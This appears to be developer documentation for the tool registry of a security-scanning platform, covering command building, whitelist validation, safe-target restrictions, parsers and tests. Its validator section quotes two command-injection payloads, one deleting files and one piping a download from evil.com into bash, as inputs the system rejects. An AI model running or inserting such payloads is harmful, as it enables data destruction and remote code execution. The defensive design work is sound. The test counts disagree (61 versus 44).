# Phase 2: Tool Registry — Implementation

## What Was Built

The Tool Registry manages the 7 security tools the platform can orchestrate:
nmap, subfinder, nuclei, gobuster, nikto, sqlmap, hydra. Each tool has a
YAML config entry, param type validators, a command builder, an
install/uninstall mechanism, a safe-target-restricted run function, and an
output parser.

## Tool Registry Config (`backend/tool_registry/tools.yaml`)

Each tool entry defines:

```yaml
- name: nmap
  risk_tier: passive              # passive | active_scan | exploit
  description: "Port and service scanner"
  command_template: ["nmap", "-sV", "-p", "{ports}", "{target}"]
  allowed_params:
    target: "ip_or_domain"
    ports: "port_range"
  required_params:
    - target
  output_parser: "nmap_parser"
  binary_name: "nmap"
  install_command: "brew install nmap"
```

**Risk tier assignments**:
- `passive`: nmap, subfinder
- `active_scan`: nuclei, gobuster, nikto, sqlmap, hydra

**Nikto `maxtime` param** (added July 2026): Nikto's full check battery can take 10+ minutes
against a single target. An optional `maxtime` param (type `nikto_maxtime`) was added to give
users control over scan duration via nikto's built-in `-maxtime <duration>` flag. Accepts
values like `120s`, `3m`, `1h` (whitelist-regex validated). Defaults to `10m` in the `defaults`
field so nikto stops gracefully on its own rather than being force-killed. The `defaults` field
is applied server-side in `build_command()` (merged via `{**defaults, **params}`), so even if
the frontend omits the param, the backend fills it in. To explicitly disable `-maxtime`, pass
an empty string (`maxtime: ""`), which the optional-param stripping logic removes.

**Install commands per tool** (real, official package manager commands):

| Tool      | Install method                                     | Why                                       |
|-----------|----------------------------------------------------|-------------------------------------------|
| nmap      | `brew install nmap`                                | macOS Homebrew — official package         |
| subfinder | `go install ...projectdiscovery/subfinder@latest`  | Official Go install method                |
| nuclei    | `go install ...projectdiscovery/nuclei@latest`     | Official Go install method                |
| gobuster  | `go install github.com/OJ/gobuster/v3@latest`      | Official Go install method                |
| nikto     | `brew install nikto`                               | macOS Homebrew — official package         |
| sqlmap    | `pip install sqlmap`                               | Official PyPI package                     |
| hydra     | `brew install hydra`                               | macOS Homebrew — official package         |

**Delete commands**: use `brew uninstall` for brew-installed tools, `rm -f`
for Go-installed binaries, and `pip uninstall -y` for pip packages.

## Param Type Validators (`backend/tool_registry/validators.py`)

Every distinct param type from tools.yaml has a strict whitelist validator:

| Type             | Validator function     | What it accepts                                                    |
|------------------|------------------------|--------------------------------------------------------------------|
| `ip_or_domain`   | `validate_ip_or_domain`| IP address, CIDR, domain name, localhost hostnames                 |
| `domain`         | `validate_domain`      | Domain name, IP address, localhost                                 |
| `url`            | `validate_url`         | `http://` or `https://` with hostname or IP (optionally :port+path)|
| `port`           | `validate_port`        | Single port 1-65535                                                |
| `port_range`     | `validate_port_range`  | Single port, range (1-1000), comma-separated list                  |
| `file_path`      | `validate_file_path`   | Alphanumeric path chars, `/`, `.`, `-`, `_`, `~` — no `..`        |
| `gobuster_mode`  | `validate_gobuster_mode`| `dir`, `dns`, `vhost`, `fuzz`, `s3`                               |
| `hydra_service`  | `validate_hydra_service`| Alphanumeric service name with `-` and `_`                        |
| `nikto_maxtime`  | `validate_nikto_maxtime`| Nikto `-maxtime` duration string: digits followed by `s`, `m`, or `h` (e.g. `120s`, `3m`, `1h`) |

All validators use **positive allow-list matching** (same pattern as Phase 1's
`is_valid_target()`), never blacklisting characters. Injection payloads like
`10.0.0.1; rm -rf /` or `10.0.0.1 && curl evil.com | bash` fail because
they don't match the expected format.

## build_command() — Core Contract (`backend/tool_registry/registry.py`)

```python
build_command(tool_name: str, params: dict) -> list[str]
```

**Validation pipeline** (sequential, first failure raises):

0. **Defaults merge** — Tool-level `defaults` dict is merged into `params` via `{**defaults, **params}`. Explicitly provided params win over defaults. This ensures the backend always fills in sensible defaults (like `maxtime: "10m"`) even if the frontend omits them. To suppress a defaulted param, pass an explicit empty string (`""`).
1. **Tool existence** — `UnknownToolError` if tool_name not in registry
2. **Param whitelist** — `UnknownParamError` if any param key not in `allowed_params`
3. **Required params** — `MissingRequiredParamError` if any required param missing/empty
4. **Value validation** — `ParamValidationError` if value fails its type validator
5. **Template filling** — replace `{param}` placeholders with validated values

**Security guarantees**:
- Returns `list[str]` only, never a single shell string
- Optional params in the template (like `{ports}`) that are not provided
  are stripped along with their preceding flag
- All values pass whitelist regex validation before being included

## is_tool_installed() (`backend/tool_registry/registry.py`)

```python
is_tool_installed(tool_name: str) -> bool
```

Uses `shutil.which(binary_name)` as the primary check — real system check,
no hardcoded/mock results. Also checks common Go binary paths
(`~/go/bin/`, `$GOPATH/bin`) as fallback, since 3 tools (gobuster,
subfinder, nuclei) are installed via `go install` which places binaries
there. This ensures the tool is detected even if the user hasn't added
`~/go/bin` to their shell PATH.

## Install / Delete — Real System Actions

```python
install_tool(tool_name: str) -> {"success": bool, "output": str, "installed": bool}
delete_tool(tool_name: str) -> {"success": bool, "output": str, "installed": bool}
```

- Runs the real install/uninstall command via `subprocess.run()` (no shell=True)
- Re-checks `is_tool_installed()` after the action to determine real outcome
- tool_name locked to the fixed registry list (no freeform execution)
- Timeouts: 300s for install, 120s for delete
- Uses `_augmented_env()` to ensure `~/go/bin/`, `/opt/homebrew/bin/`, etc.
  are in the subprocess PATH (shared helper with `run_tool()`)
- Uses `_find_binary()` (private) to locate the actual binary path for delete
- **Clear error messages**: Catches `FileNotFoundError` specifically and
  returns an actionable message: "Cannot install {tool}: requires '{dep}'
  which is not found on this system. Install {dep} first, then retry."
  This prevents raw Python `[Errno 2]` messages from reaching the user.
  Known dependency hints are maintained for `go`, `brew`, and `pip`.

## Run — Safe Target Restricted

```python
run_tool(tool_name: str, params: dict) -> {"job_id": str}
get_run_result(job_id: str) -> {"status": str, "stdout": str, "exit_code": int, "findings": dict}
```

**Flow**:
1. Calls `build_command()` first (all validation rules apply)
2. Checks resolved `target` against the safe-target allow-list:
   - `localhost`, `127.0.0.1`, `::1` — all tools
   - `scanme.nmap.org` — nmap only
3. If target not in allow-list: `SafeTargetRestrictionError` with message
   referencing Phase 3
4. Runs command via `subprocess.run()` in a background thread
5. After completion, runs the tool's output parser on stdout

**This restriction is enforced in the backend function itself**, not at the
UI level. The UI uses a dropdown of safe targets to make the restriction
visible, but the backend is the authoritative enforcement point.

## Output Parsers (`backend/tool_registry/parsers/`)

All parsers return:
```python
{"tool": str, "findings": [{"type": str, "detail": dict}, ...]}
```

| Parser            | Status        | Notes                                                  |
|-------------------|---------------|--------------------------------------------------------|
| `nmap_parser`     | ✅ Verified   | Tested against real `nmap -sV` output against localhost |
| `subfinder_parser`| ✅ Verified   | Tested against real subfinder output — 0 subdomains (safe targets), parser handles empty output gracefully |
| `nuclei_parser`   | ✅ Verified   | Tested against real nuclei output — no templates matched, parser handles empty output |
| `gobuster_parser` | ✅ Verified   | **Rewritten July 2026**: old regex required leading `/` which real gobuster output lacks; also added redirect capture. Tested against real scan of `http://demo.testfire.net` — 16 paths parsed correctly. |
| `nikto_parser`    | ✅ Verified   | Tested against real `nikto -h 127.0.0.1` output         |
| `sqlmap_parser`   | ✅ Verified   | **Rewritten July 2026**: old regex expected single-line "is vulnerable" but real sqlmap uses multi-line Parameter/Type/Title/Payload format. Parser now handles the real structure. Sample based on documented sqlmap output format. |
| `hydra_parser`    | 📄 Doc-only   | Not installed/testable on this machine — left as-is     |

Real sample output files are stored in `backend/tool_registry/test_samples/`
for the verified parsers to use in tests.

## API Endpoints (`backend/tool_registry/router.py`)

| Method | Path                               | Description                       |
|--------|------------------------------------|-----------------------------------|
| GET    | `/api/tools`                       | List all tools with install status|
| GET    | `/api/tools/{tool_name}`           | Single tool detail                |
| POST   | `/api/tools/build-command`         | Build command from params         |
| POST   | `/api/tools/{tool_name}/install`   | Install a tool                    |
| POST   | `/api/tools/{tool_name}/delete`    | Delete a tool                     |
| POST   | `/api/tools/run`                   | Run tool against safe target      |
| GET    | `/api/tools/run/{job_id}`          | Get run result/job status         |

## Tests (`backend/tests/test_tool_registry.py`)

```bash
cd backend
python -m pytest tests/test_tool_registry.py -v
```

**Test groups** (61 tests):

1. **TestBuildCommand** (23 tests) — valid commands for all 7 tools,
   injection rejection (semicolons, pipes, subshells, `&&`), unknown tool,
   missing required params, extra params, invalid port/url, nikto maxtime
   (3 tests: explicit, default-applied, invalid-rejected), gobuster wordlist
   defaulted (was MissingRequiredParamError before defaults merge fix)
2. **TestToolAvailability** (4 tests) — registry count, get tool, unknown
   tool, is_tool_installed returns bool
3. **TestValidators** (14 tests) — valid/invalid for each param type,
   includes nikto_maxtime (2 tests)
4. **TestSafeTargetRestriction** (8 tests) — localhost allowed, scanme
   allowed for nmap only, arbitrary target rejected, build_command accepts
   what run rejects
5. **TestInstallDeleteErrors** (2 tests) — install/delete FileNotFoundError
   dependency hint messages
6. **TestParsers** (10 tests) — nmap and nikto parsers against real samples,
   gobuster/subfinder/nuclei/sqlmap parsers against empty output and real samples

## File / Module Locations

```
backend/
├── main.py                          # FastAPI entry point (includes both routers)
├── tool_registry/
│   ├── __init__.py
│   ├── tools.yaml                   # Registry config for all 7 tools
│   ├── validators.py                # Param type validators (whitelist regex)
│   ├── registry.py                  # build_command, is_tool_installed, install, delete, run
│   ├── router.py                    # FastAPI REST endpoints for tools
│   ├── parsers/
│   │   ├── __init__.py
│   │   ├── nmap_parser.py           # Verified against real output
│   │   ├── subfinder_parser.py      # Verified against real output
│   │   ├── nuclei_parser.py         # Verified against real output
│   │   ├── gobuster_parser.py       # Verified against real output
│   │   ├── nikto_parser.py          # Verified against real output
│   │   ├── sqlmap_parser.py         # ✅ Verified (rewritten July 2026)
│   │   └── hydra_parser.py          # 📄 Doc-only
│   └── test_samples/
│       ├── nmap_sample.txt          # Real nmap output against localhost
│       ├── nikto_sample.txt         # Real nikto output against localhost
│       ├── gobuster_sample.txt      # Real gobuster output against demo.testfire.net (16 paths)
│       └── sqlmap_sample.txt        # Output based on documented format
└── tests/
    └── test_tool_registry.py        # 44 tests covering all validation rules

frontend/
├── src/
│   ├── App.tsx                      # + Tools tab
│   ├── App.css                      # + ToolRegistry styles
│   ├── hooks/
│   │   └── useApi.ts                # + Tool API functions and types
│   └── components/
│       └── ToolRegistry.tsx         # Tool grid, build panel, run panel
```

## Frontend Structure

The ToolRegistry component (`ToolRegistry.tsx`) provides three panels:

1. **Tool Grid** — cards for all 7 tools showing name, risk tier
   (color-coded badge), description, installed status (green dot = yes,
   amber dot = no), and Install/Delete button (mutually exclusive)
2. **Build Command Panel** — param input fields based on the selected
   tool's `allowed_params`, "Build Command" button that calls the API,
   shows the resulting command list or validation error
3. **Run Panel** — visible only for installed tools, target is a
   dropdown restricted to safe test targets (localhost, 127.0.0.1,
   scanme.nmap.org for nmap), shows real execution output and parsed
   findings when the job completes

## Decisions & Tradeoffs

| Decision | Rationale |
|----------|-----------|
| **YAML for tool config** | Human-readable, easy to add new tools without code changes, separates config from logic |
| **Whitelist validators** (not blacklist) | Same philosophy as Phase 1 — define what's allowed rather than trying to enumerate bad patterns. Injection payloads are structurally invalid, not just blocked on a character list |
| **Background thread for run** | Simple polling (background thread + status dict) is adequate for Phase 2. Full async job queue (Celery/RQ) comes in Phase 3 with the Sandbox Executor |
| **Safe-target restriction in backend** | The restriction is the last line of defense — even if a future frontend doesn't enforce it, the backend refuses unsafe targets. The error message explicitly references Phase 3 |
| **`[ \t]*` instead of `\s*` in nmap parser** | `\s` in Python matches `\n`, causing the parser to greedily consume newlines and capture next-line content as "version". Using `[ \t]` restricts to horizontal whitespace only |
| **Separate test sample files** | Real output is captured once and committed alongside the parser, so tests are deterministic and don't require the tool to be installed at test time |
| **Required params separate from template** | Not all template params are required (e.g. `{ports}` in nmap). Required_params list controls mandatory checks; template drives output construction |
| **Defaults merged server-side in build_command** | Applying `{**defaults, **params}` in `build_command()` provides a safety net: even if the frontend sends stale/missing params (e.g. due to cached `listTools()` response before `defaults` was added), the backend fills in sensible defaults. Explicit user-provided values always win. To suppress a defaulted param, pass `""` (empty string), which the optional-param stripping logic removes. This design matches whitelist-security principles — the backend is the authoritative enforcement point. |

## Troubleshooting

**GET /api/tools returns 404**: If the backend was started before the
tool_registry changes were made, restart it. The old code doesn't have the
tools routes. Run `uvicorn main:app --reload --port 8000` to pick up changes
automatically.

**Frontend shows "Failed to fetch tools"**: Same cause — stale backend.
Check the browser's network tab for the actual HTTP status. If it's 404,
restart the backend. If it's a CORS error, verify the backend CORS origins
match the frontend's URL.

**Go tools (gobuster/subfinder/nuclei) show "not installed"**: The three
Go-installed tools place binaries in `~/go/bin/`. If `is_tool_installed()`
used only `shutil.which()`, they'd show as not installed when `~/go/bin/`
isn't on `$PATH`. Fixed by adding fallback checks for `~/go/bin/`,
`$GOPATH/bin`, `/opt/homebrew/bin`, and `/usr/local/bin` to
`is_tool_installed()`. The Run button also augments subprocess PATH with
these directories via `_augmented_env()`.

**Run button does nothing (no network request)**: The Run button's
`onClick` handler checks `if (!runToolName) return;`. If `runToolName`
was never set (stays as `''`), no API call fires. This was caused by a
hidden `<input type="hidden" onChange={...}>` that was supposed to
populate `runToolName` but hidden inputs never fire onChange. Fixed by
setting `runToolName` directly in `handleSelectTool()` when a tool card is
clicked, and removing the dead hidden input.

**Install button returns `[Errno 2] No such file or directory`**: The
install command depends on a system package manager (`go`, `brew`, `pip`)
that is not installed. This error is now caught and replaced with a clear
message: "Cannot install {tool}: requires '{dep}' which is not found on
this system. Install {dep} first, then retry."
